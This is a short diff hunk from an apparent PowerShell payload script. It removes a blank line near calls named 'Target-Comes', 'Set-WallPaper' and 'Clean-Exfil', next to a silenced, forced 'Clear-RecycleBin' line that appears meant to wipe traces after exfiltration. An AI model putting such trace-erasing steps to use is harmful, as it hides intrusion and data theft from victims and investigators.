@@ -98,7 +98,6 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
 
-
 Target-Comes
 Set-WallPaper -Image $wp -Style Fill
 Clean-Exfil
